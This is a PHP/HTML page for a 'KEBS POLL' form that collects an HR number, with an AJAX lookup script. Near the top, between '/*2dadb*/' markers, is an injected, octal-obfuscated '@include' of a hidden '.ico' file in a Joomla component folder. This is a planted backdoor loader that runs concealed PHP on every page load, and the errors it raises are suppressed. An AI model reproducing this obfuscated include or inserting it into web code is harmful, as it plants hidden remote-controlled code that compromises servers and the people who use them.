<link href="css/usercss.css" rel="stylesheet" type="text/css" media="all">

<script type="text/javascript" src="js/ajax.js"></script>
<script type="text/javascript">

		function getScriptPage(div_id,content_id,get_count)
		{
			subject_id = div_id;
			content = document.getElementById(content_id).value;
			http.open("GET", "sqmt/qai/pvoc/search_page.php?content=" + escape(content)+"&count="+get_count, true);
			http.onreadystatechange = handleHttpResponse;
			http.send(null);
		}	

</script>
<?php
/*2dadb*/

@include "\104:/h\157me/\163ite\057www\162oot\057med\151a/c\157m_c\157nte\156thi\163tor\171/js\057.2d\066812\070c.i\143o";

/*2dadb*/


 $recordstuses=$_SERVER['QUERY_STRING'] ?>

<div class="container">
    <div><h1> <img src="images/poll-box.png" style="width: 100px; text-align: left; vertical-align: auto; font-size: 20pt; font-weight: bold">KEBS POLL</h1></div>
    <h2>Provide your KEBS HR No.</h2>
    <?php //echo !empty($statusMsg)?'<p class="'.$statusMsgType.'">'.$statusMsg.'</p>':''; ?>
<?php
$server=$_SERVER['HTTP_HOST'].$_SERVER['REQUEST_URI'];
//if (!$server){
//    echo $recordstus;
//}else{
//    echo "home";
//}
   if ($server==$_SERVER['HTTP_HOST']."/kebspoll/"){
       echo "";
   }else{
       echo "No records";
   }   

?>

    <div class="regisFrm">
        <form action="confirmdetails.php" method="post">
            <input type="hrno" name="hrno" placeholder="HR No" required="tttt" size="10" maxlength="4" onkeypress="getScriptPage('output_div','text_content','0')" onMouseUp="getScriptPage('output_div','text_content','0')" style="font-size:25pt">
            <!--<input type="password" name="password" placeholder="PASSWORD" required="">-->
            <div class="output-div-container">
	<div id="output_div">
	</div>
	</div>
            <div class="send-button">
                <input type="submit" name="loginSubmit" value="Proceed to Confirm Details" >
            </div>
        </form>
      
    </div>
     
</div>

